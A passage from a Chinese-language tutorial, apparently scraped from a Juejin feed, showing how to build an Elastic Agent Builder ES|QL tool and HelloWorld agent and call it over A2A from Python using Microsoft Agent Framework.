<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/940bc29e283347bda465a0f4b54bbbf4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764492022&amp;x-signature=OabfpsMxQM7E21hne7S9ZaiZgdQ%3D" alt="" loading="lazy"/></p>
<p>然后只需问：“我有什么数据？”</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a55c7d9b2177413aad033832b886877a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764492022&amp;x-signature=%2FbQdDI%2B6qLP4oo3XV4UKlM%2FpKNw%3D" alt="" loading="lazy"/></p>
<p>默认的 Elastic AI Agent 会提供当前存储在 Elastic 中数据的良好总结。</p>
<h2 data-id="heading-2">创建一个 tool</h2>
<p>此演练的下一步是创建一个能够使用存储在 Elastic 中数据的 agent。</p>
<p>如你所见，Elastic Agent Builder 中的默认 agent 已经可以用来与你的数据聊天，但要真正赋予 agent 自定义能力，它们需要通过 <a href="https://link.juejin.cn?target=https%3A%2F%2Fmodelcontextprotocol.io%2Fdocs%2Fgetting-started%2Fintro" title="https://modelcontextprotocol.io/docs/getting-started/intro" target="_blank" ref="nofollow noopener noreferrer">Model Context Protocol (MCP)</a> 访问 tools。Agent Builder 拥有完整的 tool 创建和管理功能，你可以用它快速创建自定义 MCP tools，这些 tools 会托管在与数据相同的可扩展 Elastic 项目中。</p>
<p>现在让我们在 Elastic Agent Builder 中创建一个可以访问 Elastic 中数据的 tool。点击 + New 开始。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f795dec328184949b4ca1a878f906086~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764492022&amp;x-signature=IeE4iZ2pPR7lQvQCsTfhZU7jtOU%3D" alt="" loading="lazy"/></p>
<p>然后点击 Manage tools。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4be79f7ee762471588354922a413420a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764492022&amp;x-signature=uSYQXw3TsINQawcf6tcrSsfOw8c%3D" alt="" loading="lazy"/></p>
<p>点击 + New tool 按钮。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0dcbda00590748ed9a0d6bd43dba5e57~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764492022&amp;x-signature=SGxwM%2F5j4z34HuiNcVpw5x7o%2FLA%3D" alt="" loading="lazy"/></p>
<p>在 Create Tool 表单中，选择 ES|QL 作为 tool Type，并输入以下值。</p>
<p><strong>Tool ID</strong>：</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-string">`example.get_greetings`</span>AI写代码
</code></pre>
<p><strong>Description</strong>：</p>
<pre><code class="hljs language-sql" lang="sql">`<span class="hljs-keyword">Get</span> greetings doc <span class="hljs-keyword">from</span> Elasticsearch my_docs index.`AI写代码
</code></pre>
<p><strong>Configuration</strong>：在 ES|QL Query 文本区域中输入以下查询：</p>
<pre><code class="hljs language-ini" lang="ini">`FROM my-docs | WHERE <span class="hljs-attr">filename</span> == <span class="hljs-string">"greetings.md"</span>`AI写代码
</code></pre>
<p>你完成的 Create a new tool 表单应如下所示。点击 Save 创建该 tool。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fd7b2dba5b034284a21afdd127023f2c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764492022&amp;x-signature=AeFPT%2Fh5SfNrlEw3Ux7mvQT6ie8%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-3">创建一个 Agent 并为其分配一个 tool</h2>
<p>啊！有了新 tool 并准备使用的感觉真好。Agents 需要 tools 来赋予它们超出一般 LLM 能力的特殊功能，而我们现在有了一个全新的 tool。让我们创建一个可以充分利用我们 tool 的 agent。在导航菜单中选择 Agents。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5017f7bf2d6343a2ab9358ecbf0de508~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764492022&amp;x-signature=b%2B8xWmBlJReUS4EKfz9%2F4lTF9kc%3D" alt="" loading="lazy"/></p>
<p>点击 Create a new agent。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4d985de944f04cf79001770bdb005183~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764492022&amp;x-signature=fosa7HZKNd7e%2FtFgh31Z436yVjs%3D" alt="" loading="lazy"/></p>
<p>根据 tool 的名称和它访问的数据，你可能已经猜到我们要创建一个问候 agent，你猜对了！让我们现在创建一个 Hello World agent。</p>
<p>在 New Agent 表单中，输入以下值。</p>
<p><strong>Agent ID</strong>：输入文本：</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-string">`helloworld_agent`</span>AI写代码
</code></pre>
<p>在 <strong>Custom Instructions</strong> 文本区域中输入以下指令：</p>
<pre><code class="hljs language-sql" lang="sql">`

<span class="hljs-number">1.</span>  If the prompt <span class="hljs-keyword">contains</span> greeting text <span class="hljs-keyword">like</span> "Hi" <span class="hljs-keyword">or</span> "Hello" <span class="hljs-keyword">then</span> respond <span class="hljs-keyword">with</span> <span class="hljs-keyword">only</span> the Basic Hello text <span class="hljs-keyword">from</span> your documents.

<span class="hljs-number">3.</span>  If the prompt <span class="hljs-keyword">contains</span> the text “Hello World” <span class="hljs-keyword">then</span> respond <span class="hljs-keyword">with</span> <span class="hljs-keyword">only</span> the Hello World text <span class="hljs-keyword">from</span> your documents.

<span class="hljs-number">5.</span>  <span class="hljs-keyword">In</span> <span class="hljs-keyword">all</span> other cases <span class="hljs-keyword">where</span> the prompt does <span class="hljs-keyword">not</span> contain greeting words, <span class="hljs-keyword">then</span> respond <span class="hljs-keyword">with</span> <span class="hljs-keyword">only</span> the <span class="hljs-keyword">Not</span> Greeting text <span class="hljs-keyword">from</span> your documents.

`AI写代码
</code></pre>
<p><strong>Display name</strong>：输入文本：</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-string">`HelloWorld Agent`</span>AI写代码
</code></pre>
<p><strong>Display description</strong>：输入文本：</p>
<pre><code class="hljs language-css" lang="css">`An agent that responds <span class="hljs-selector-tag">to</span> greetings.`AI写代码
</code></pre>
<p>你完成的 <strong>New Agent</strong> 表单应如下所示。下一步是为 agent 分配我们在上一步创建的 tool。点击 <strong>Tools</strong> 标签。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2928610d469b4f239c161d86e86804aa~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764492022&amp;x-signature=hUJZPj5vxVr1qYtC3kaiP1CYrwE%3D" alt="" loading="lazy"/></p>
<p>只选择我们之前创建的 example.get_greetings tool。取消选择所有其他可用的 tools。这将配置正在创建的 agent 仅能访问我们创建的 tool。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c721718bf9ec4b40bcf188d59bf9774c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764492022&amp;x-signature=TQd0QyujnA1AniH%2Fb8RQ%2BCA2lZE%3D" alt="" loading="lazy"/></p>
<p>点击 <strong>Save</strong> 创建该 agent。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6d5ec24af7af4120a55faa92315e6f5c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764492022&amp;x-signature=xPsKPYZuIowxpotZNEknI3NSJ8o%3D" alt="" loading="lazy"/></p>
<p>你将被带到 Agents 列表，在那里可以看到新的 HelloWorld Agent 已经创建。我们可以在 Agent Builder 中快速测试我们的新 agent。在导航菜单中选择 Agents。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0ab5fe1716b843bda92ca29fce18144a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764492022&amp;x-signature=zSBhYbP%2F4wrlDSMO8MmEnBJIb4s%3D" alt="" loading="lazy"/></p>
<p>在 Agent Chat agent 选择器中选择 HelloWorld Agent。输入提示 “hello world”，你应该会从存储在 my-docs Elastic 索引中的 greetings.md 文档中得到 Hello World 文本。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bcb09d6d4c534b60932b7d0c7ed40b40~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764492022&amp;x-signature=SmMPirV7gu%2BvXWLbgLxxPgIIcDY%3D" alt="" loading="lazy"/></p>
<p>干得好。现在我们知道我们的 agent 按预期工作，让我们探索在 Agent Builder 中创建的 tools 和 agents 带来的即时开发好处。你在 Agent Builder 中创建的任何 tools 都可以通过 MCP 被任何支持 MCP 的 agent 构建平台使用。同时，你在 Agent Builder 中创建的任何 agents 都可以在任何支持 AgentToAgent (A2A) 协议的 agent 构建平台中使用。</p>
<h2 data-id="heading-4">Microsoft Agent Framework</h2>
<p>如果你有兴趣尝试新的 Agent 开发工具，那么最近宣布的开源开发工具包 <a href="https://link.juejin.cn?target=https%3A%2F%2Flearn.microsoft.com%2Fen-us%2Fagent-framework%2Foverview%2Fagent-framework-overview" title="https://learn.microsoft.com/en-us/agent-framework/overview/agent-framework-overview" target="_blank" ref="nofollow noopener noreferrer">Microsoft Agent Framework</a> 你绝对应该亲自尝试。Agent Framework 允许你使用 A2A 协议来编排 agent 应用，可以组合在不同主机上运行的多个 agents，从而实现仅靠通用 GenAI Large Language Model 无法实现的解决方案。Agent Framework 提供 Python 和 C# 版本。让我们看看如何使用基于 Python 的 Agent Framework 调用我们刚创建的自定义 Elastic Agent。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/311fb06b0c614586bb26a53b6a96af79~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764492022&amp;x-signature=Bzs94%2BOuTFe04%2BhVGsDP%2FMEnX%2FI%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-5">在 Python 中开始使用 Agent Framework</h2>
<p>让我们运行一些代码！在你的本地电脑上打开 <a href="https://link.juejin.cn?target=https%3A%2F%2Fcode.visualstudio.com%2Fdownload" title="https://code.visualstudio.com/download" target="_blank" ref="nofollow noopener noreferrer">Visual Studio Code</a> 并打开一个新的终端。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/198375dc5d2e453c8eb1c58610cfeb11~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764492022&amp;x-signature=hZUoZ9K3LXmkugUcvgPo3ufgByg%3D" alt="" loading="lazy"/></p>
<p>在打开的终端中，克隆包含 <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Felastic%2Felasticsearch-labs%2Ftree%2Fmain%2Fsupporting-blog-content%2Fagent-builder-a2a-agent-framework" title="https://github.com/elastic/elasticsearch-labs/tree/main/supporting-blog-content/agent-builder-a2a-agent-framework" target="_blank" ref="nofollow noopener noreferrer">Elastic Agent Builder A2A 示例应用</a>的 Elastic Search Labs 源代码仓库。</p>
<pre><code class="hljs language-bash" lang="bash">`git <span class="hljs-built_in">clone</span> https://github.com/elastic/elasticsearch-labs`AI写代码
</code></pre>
<p>在终端中，使用 cd 命令切换目录到 elasticsearch-labs。</p>
<pre><code class="hljs language-bash" lang="bash">`<span class="hljs-built_in">cd</span> elasticsearch-labs`AI写代码
</code></pre>
<p>在终端中，输入以下命令以在 Visual Studio Code 编辑器中打开当前文件夹。</p>
<pre><code class="hljs language-css" lang="css">`<span class="hljs-selector-tag">code</span> .`AI写代码
</code></pre>
<p>在 Visual Studio 文件资源管理器中，展开 supporting-blog-content 和 agent-builder-a2a-agent-framework 文件夹，然后在文本编辑器中打开名为 elastic_agent_builder_a2a.py 的文件。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1651e1e6031f45559a4012b352edd887~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764492022&amp;x-signature=KveKCpM6ZfqGwDZ0ue5ZqQFwF0k%3D" alt="" loading="lazy"/></p>
<p>这是你在文本编辑器中应该看到的 elastic_agent_builder_a2a.py 的内容：</p>
<pre><code class="hljs language-ini" lang="ini">`

1.  import asyncio
2.  from dotenv import load_dotenv
3.  import httpx
4.  import os
5.  from a2a.client import A2ACardResolver
6.  from agent_framework.a2a import A2AAgent

9.  async def main():
10.      load_dotenv()
<span class="hljs-attr">11.      a2a_agent_host</span> = os.getenv(<span class="hljs-string">"ES_AGENT_URL"</span>)
<span class="hljs-attr">12.      a2a_agent_key</span> = os.getenv(<span class="hljs-string">"ES_API_KEY"</span>)

14.      print(f"Connection to Elastic A2A agent at: {a2a_agent_host}")

<span class="hljs-attr">16.      custom_headers</span> = {<span class="hljs-string">"Authorization"</span>: f<span class="hljs-string">"ApiKey {a2a_agent_key}"</span>}

18.      async with httpx.AsyncClient(<span class="hljs-attr">timeout</span>=<span class="hljs-number">60.0</span>, headers=custom_headers) as http_client:
19.          <span class="hljs-comment"># Resolve the A2A Agent Card</span>
<span class="hljs-attr">20.          resolver</span> = A2ACardResolver(httpx_client=http_client, base_url=a2a_agent_host)
<span class="hljs-attr">21.          agent_card</span> = await resolver.get_agent_card(
<span class="hljs-attr">22.              relative_card_path</span>=<span class="hljs-string">"/helloworld_agent.json"</span>
23.          )
24.          print(f"Found Agent: {agent_card.name} - {agent_card.description}")

26.          <span class="hljs-comment"># Use the Agent</span>
<span class="hljs-attr">27.          agent</span> = A2AAgent(
<span class="hljs-attr">28.              name</span>=agent_card.name,
<span class="hljs-attr">29.              description</span>=agent_card.description,
<span class="hljs-attr">30.              agent_card</span>=agent_card,
<span class="hljs-attr">31.              url</span>=a2a_agent_host,
<span class="hljs-attr">32.              http_client</span>=http_client,
33.          )
<span class="hljs-attr">34.          prompt</span> = input(<span class="hljs-string">"Enter Greeting &gt;&gt;&gt; "</span>)
35.          print("\nSending message to Elastic A2A agent...")
<span class="hljs-attr">36.          response</span> = await agent.run(prompt)
37.          print("\nAgent Response:")
38.          for message in response.messages:
39.              print(message.text)

42.  if <span class="hljs-attr">__name__</span> == <span class="hljs-string">"__main__"</span>:
43.      asyncio.run(main())

`AI写代码!<span class="hljs-section">[]</span>(https://csdnimg.cn/release/blogv2/dist/pc/img/runCode/icon-arrowwhite.png)
</code></pre>
<p>main() 方法中的代码演示了如何使用 Agent Framework 控制你的 Elastic Agent Builder agent。它使用来自你的 Elastic 项目的 URL 和 API key 为 agent 创建一个 http_client。然后调用 Agent Framework 的 A2ACardResolver，并传入该 http_client，以根据 relative_card_path 为 “/helloworld_agent.json” 获取 agent 的 A2A agent card，从而引用你的 agent 的 Agent ID，即 “helloworld_agent”。接着，代码使用 Agent Framework 调用你的 agent 并传入 A2A agent card。main() 方法的最后部分提示应用的用户输入一个 “greeting”，然后将用户输入作为提示发送给你的 agent。根据你创建 agent 时指定的指令和 tools，agent 的响应会显示给应用用户。</p>
<h2 data-id="heading-6">将你的 agent URL 和 API Key 设置为环境变量</h2>
<p>复制文件 env.example 并将新文件命名为 .env。编辑新创建的 .env 文件，将环境变量的值设置为从你的 Elastic 项目中复制的特定值。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9469770a5dca47b09693c7aa46067d90~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764492022&amp;x-signature=J5Uzv5MLL%2FbU7e5nmq9Bp3%2FVULA%3D" alt="" loading="lazy"/></p>
<p>首先，我们将 替换为你可以从 Elastic 项目中的 Agent Builder - Tools 页面复制的 Agent URL 路径。回到 Elastic Agent Builder，在导航菜单中点击 Agents。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/534f619664af4bf791846d2a8208e328~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764492022&amp;x-signature=eoVGbnWNvggB8m9nF8t1Fse2T%2FE%3D" alt="" loading="lazy"/></p>
<p>选择 Manage tools。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b121e546060a489a81c7424be35243e3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764492022&amp;x-signature=1scXn%2FnXYZcAsyOuOudr1ve5DMA%3D" alt="" loading="lazy"/></p>
<p>点击 Tools 页面顶部的 MCP Server 下拉菜单。选择 Copy MCP Server URL。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/05044a5651b24a86a366d653c0752979~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764492022&amp;x-signature=xj6Xt%2F44qYoJirHe2jTJa64oyBE%3D" alt="" loading="lazy"/></p>
<p>回到 Visual Studio Code，在 .env 文件中找到占位符文本 “<strong>YOUR-ELASTIC-AGENT-BUILDER-URL&gt;</strong>”，并粘贴复制的 MCP Server URL 来替换占位符文本。现在编辑粘贴的 MCP Server URL。删除 URL 末尾的 “mcp” 文本，并替换为 “a2a”。编辑后的 URL 应该看起来像这样：</p>
<pre><code class="hljs language-bash" lang="bash">`https://example-project-a123.kb.westus2.azure.elastic.cloud/api/agent_builder/a2a`AI写代码
</code></pre>
<p>下一个需要在 .env 文件中替换的占位符文本是 。我们将用来自你的 Elastic 项目的实际 API Key 替换它。回到你的 Elastic 项目，在导航菜单中点击 Elasticsearch。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7b2b86cd27784905849c2304808d5493~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764492022&amp;x-signature=peXEnbb6%2F3PuGEDHrItEvTSjem8%3D" alt="" loading="lazy"/></p>
<p>点击 Create API key 创建一个新的 API key。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1dbb46d8db094070bd110f7fdd5d7898~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764492022&amp;x-signature=IYPENBjhPV0MMq5a5RoROTY6zHE%3D" alt="" loading="lazy"/></p>
<p>输入 API key 的 Name，然后点击 Create API key。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f834245ec3374a2895618490a85a64ed~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764492022&amp;x-signature=hNUIUlTTwVtJiBjj%2FdMs%2BJp2CFY%3D" alt="" loading="lazy"/></p>
<p>点击复制按钮来复制 API key。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/37b367a4c6b84a2cadbc0841747fbc81~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764492022&amp;x-signature=%2FsyDwD1DTJVvfbU9CKwZKDx0Qxw%3D" alt="" loading="lazy"/></p>
<p>回到 Visual Studio Code，在 .env 文件中找到占位符文本 “<strong/>”，并粘贴复制的 API Key 值来替换占位符文本。</p>
<p>现在我们可以保存对 .env 文件所做的更改。编辑后的文件应看起来像这样：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/95372068b90a495499b4578ce6428ecf~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764492022&amp;x-signature=kKD16WypLILv%2B4KNXFIOEDyHTPc%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-7">运行示例应用</h2>
<p>现在是运行代码的时候了。为此，在 Visual Studio Code 中打开一个新终端。点击顶部菜单的 Terminal，然后选择 New Terminal。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bc40130777204bd6bc3dc1ecb5ccc31c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764492022&amp;x-signature=xwJ4mRuJokjjDeooYc2QONj1kEg%3D" alt="" loading="lazy"/></p>
<p>在新终端中，使用 cd 命令切换目录到包含 agent-builder-a2a-agent-framework 示例应用的目录。</p>
<pre><code class="hljs language-bash" lang="bash">`<span class="hljs-built_in">cd</span> elasticsearch-labs/supporting-blog-content/agent-builder-a2a-agent-framework`AI写代码
</code></pre>
<p>在终端中，通过运行以下代码创建一个 Python 虚拟环境。</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-string">`python -m venv .venv`</span>AI写代码
</code></pre>
<p>在终端窗口中运行以下命令以激活虚拟环境（根据你的操作系统）：</p>
<ul>
<li>如果你使用的是 MacOS 或 Linux，激活虚拟环境的命令是：</li>
</ul>

<pre><code class="hljs language-bash" lang="bash">`<span class="hljs-built_in">source</span> .venv/bin/activate`AI写代码
</code></pre>
<p>如果你使用的是 Windows，激活虚拟环境的命令是：</p>
<pre><code class="hljs language-r" lang="r">`.venv\Scripts\activate`AI写代码
</code></pre>
<p>elastic_agent_builder_a2a.py 文件中的代码由 Microsoft Agent Framework 驱动，我们仍然需要安装它，所以现在来安装。运行以下 pip 命令以安装基于 Python 的 Agent Framework 及其所需的 Python 包：</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-string">`pip install -r requirements.txt`</span>AI写代码
</code></pre>
<p>太棒了！现在一切都已就绪。是时候体验那种美妙的感觉了……让我们运行它。在终端中输入以下命令运行示例代码：</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-string">`python elastic_agent_builder_a2a.py`</span>AI写代码
</code></pre>
<p>你应该会看到 Agent Framework 连接到 Elastic Agent。当提示输入 greeting 时，输入 “hello world”。你应该会看到 HelloWorld Agent 的响应 → Hello World! 🌎</p>
<p>顶尖的工作！</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0a8870e7751f4c90a39578f5075491bb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764492022&amp;x-signature=7SVFOAZ9Wv%2F3mt5nnSNPU0l0UGU%3D" alt="" loading="lazy"/></p>
<p>在 Agent Builder 中构建 agents 并将它们连接到 tools，可以让你立即与最新的 agent 开发平台（如 Microsoft Agent Framework）实现可操作性。你现在已经知道如何创建一个 Elastic agent 并将其用作可扩展的相关数据源，随时为你接下来构建的所有 AI 应用提供自定义上下文。</p>
<p>今天就免费试用 <a href="https://link.juejin.cn?target=https%3A%2F%2Fcloud.elastic.co%2Fregistration%3Futm_source%3Dagentic-ai-category%26utm_medium%3Dsearch-labs%26utm_campaign%3Dagent-builder" title="https://cloud.elastic.co/registration?utm_source=agentic-ai-category&amp;utm_medium=search-labs&amp;utm_campaign=agent-builder" target="_blank" ref="nofollow noopener noreferrer">Elastic</a> 并创建一些 agents 吧！</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[用 LLM 自动生成 SQL：从 SQLite Schema 到自然语言查询的完整实践]]></title>    <link>https://juejin.cn/post/7575102474640162867</link>    <guid>https://juejin.cn/post/7575102474640162867</guid>    <pubDate>2025-11-23T08:47:44.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575102474640162867" data-draft-id="7574651025728110630" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="用 LLM 自动生成 SQL：从 SQLite Schema 到自然语言查询的完整实践"/> <meta itemprop="keywords" content="全栈"/> <meta itemprop="datePublished" content="2025-11-23T08:47:44.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="玉宇夕落"/> <meta itemprop="url" content="https://juejin.cn/user/3323164053734988"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            用 LLM 自动生成 SQL：从 SQLite Schema 到自然语言查询的完整实践
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3323164053734988/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    玉宇夕落
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-23T08:47:44.000Z" title="Sun Nov 23 2025 08:47:44 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-23
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
